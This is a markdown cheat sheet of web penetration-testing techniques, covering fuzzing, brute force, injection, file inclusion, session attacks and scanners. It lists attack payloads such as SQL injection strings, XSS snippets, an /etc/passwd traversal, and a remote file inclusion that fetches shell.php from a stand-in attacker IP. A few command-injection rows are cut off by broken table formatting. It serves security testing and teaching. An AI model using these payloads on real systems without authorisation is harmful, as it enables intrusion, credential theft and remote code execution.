| **Category** | **Purpose** | **Tool/Command Examples** | **Notes** |
| --- | --- | --- | --- |
| **Reconnaissance** |  |  |  |
| Identify Technologies | Determine web server, framework, and CMS. | `whatweb <url>`  `wappalyzer <url>` | Identifies technologies, versions, and possible vulnerabilities. |
| Passive Information Gathering | Analyze website content and source code. | Use browser tools like **View Source** or **Burp Suite Repeater**. | Look for comments, API keys, or sensitive info in HTML/JS files. |
| **Subdomain Fuzzing** | Discover subdomains of a target domain using ffuf. | `ffuf -u http://FUZZ.example.com -w /path/to/subdomains.txt -v` | Replace `example.com` with the target domain. |
|  | Fuzz with HTTPS subdomains. | `ffuf -u https://FUZZ.example.com -w /path/to/subdomains.txt -v` | Useful for domains that enforce HTTPS. |
|  | Filter responses by size to find valid subdomains. | `ffuf -u http://FUZZ.example.com -w /path/to/subdomains.txt -fc 404` | Use `-fc <code>` to filter specific response codes like 404. |
|  | Fuzz with IP ranges for internal subdomains. | `ffuf -u http://FUZZ.internal.example.com -w /path/to/subdomains.txt` | Use for testing environments with internal subdomain structures. |
|  | Save results to a file. | `ffuf -u http://FUZZ.example.com -w /path/to/subdomains.txt -o output.json -of json` | Use the JSON format for easy parsing and further automation. |
|  | Recursive subdomain fuzzing. | Use discovered subdomains as input for another round of ffuf scanning. | Manually add discovered subdomains to a new wordlist for deeper fuzzing. |
| **Common Wordlists** | Use default or custom subdomain lists. | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt` | SecLists provides comprehensive subdomain lists. |
|  | Create a custom subdomain wordlist. | `cewl -d 2 -w subdomains.txt http://target.example.com` | Crawl the target website to generate targeted subdomain guesses. |
| **Validation** | Verify subdomains with DNS resolution. | `dig <subdomain>.example.com` or `nslookup <subdomain>.example.com` | Ensure subdomains resolve to valid IP addresses. |
|  |  |  |  |
| Directory Enumeration | Discover hidden directories and files. | `gobuster dir -u <url> -w /path/to/wordlist.txt`  `ffuf -u <url>/FUZZ -w /path/to/wordlist.txt` | Use different wordlists for better coverage (e.g., SecLists). |
| Parameter Discovery | Find hidden GET/POST parameters. | `ffuf -u <url>?FUZZ=test -w /path/to/wordlist.txt -fs <known_response_size>` | Use `-fs` to filter responses by size or other filtering options. |
| **Authentication Attacks** |  |  |  |
| Brute Force Login | Attempt credential brute-forcing. | `hydra -l <username> -P /path/to/passwords.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"` | Customize form parameters to match the application’s structure. |
| Bypass Login Protections | Attempt bypass techniques (e.g., SQLi or weak logic). | `' OR '1'='1`  `admin'--` | Test login forms with SQL injection payloads or logic bypass techniques. |
| **Input Validation** |  |  |  |
| SQL Injection | Exploit vulnerable SQL queries. | `sqlmap -u <url> --dbs` | Automate injection discovery and exploitation with SQLMap. |
| Cross-Site Scripting (XSS) | Inject JavaScript to execute in the browser. | `<script>alert('XSS')</script>`  `<img src=x onerror=alert('XSS')>` | Test input fields and HTTP headers for reflection or persistent XSS. |
| Command Injection | Execute system commands through vulnerable input. | `http://<target>/vulnerable?cmd=ls`  ` | whoami` |
| **File Inclusion/Uploads** |  |  |  |
| Local File Inclusion (LFI) | Exploit file path vulnerabilities to read local files. | `http://<target>/?file=../../../../etc/passwd` | Use tools like `fimap` to automate discovery. |
| Remote File Inclusion (RFI) | Include remote files for code execution. | `http://<target>/?file=http://<attacker_IP>/shell.php` | Ensure the target server has internet access for RFI. |
| Malicious File Upload | Upload malicious files for execution. | Upload reverse shell (e.g., PHP). | Use tools like Burp Suite to intercept and modify file upload requests. |
| **Session/Authentication Attacks** |  |  |  |
| Session Fixation | Force a victim to use an attacker-controlled session. | Manually set `Set-Cookie` headers with a crafted session ID. | Test with weak session management systems. |
| Session Hijacking | Steal active sessions from users. | Intercept cookies with tools like Burp Suite or `mitmproxy`. | Look for insecure cookies (`HTTPOnly`, `Secure` flags missing). |
| JWT Manipulation | Tamper with JSON Web Tokens. | Decode and modify JWTs with tools like `jwt_tool` or `jwt.io`. | Check for weak signing algorithms like `none` or hardcoded keys. |
| **Exploitation** |  |  |  |
| Command Execution | Execute OS commands via vulnerable parameters. | `curl http://<target>/vuln?cmd=cat /etc/passwd` | Use chained commands (`;`, ` |
| SSRF (Server-Side Request Forgery) | Exploit server-side requests to access internal systems. | `curl http://<target>?url=http://127.0.0.1:22` | Look for vulnerable URL parameters; escalate to RCE or internal network enumeration. |
| Open Redirects | Redirect users to malicious sites. | `http://<target>?url=http://evil.com` | Check for vulnerable `url` or `redirect` parameters. |
| **Post-Exploitation** |  |  |  |
| Cookie/Token Replay | Replay captured cookies or tokens to impersonate users. | Use browser developer tools or tools like `Cookie Editor`. | Test for missing `HttpOnly`, `Secure`, or CSRF protections. |
| Privilege Escalation in Apps | Exploit weak permissions or roles. | Test user functionality manually or with tools like Burp Intruder. | Check for IDOR (Insecure Direct Object References) vulnerabilities. |
| Sensitive Data Exposure | Search for leaked credentials or sensitive information. | Use tools like `strings` or search exposed directories. | Look for `.git`, `.env`, backup files, or sensitive configurations. |
| **Automation Frameworks** |  |  |  |
| OWASP ZAP | Automated scanning for web vulnerabilities. | `zap-baseline.py -t <url>` | Useful for identifying common vulnerabilities quickly. |
| Burp Suite | Manual and automated testing for web vulnerabilities. | Use Burp Intruder and Repeater for payload testing. | Ensure the application proxy is configured correctly. |
| Nikto | Scan web servers for known vulnerabilities. | `nikto -h <url>` | Useful for detecting outdated server software and misconfigurations. |
 
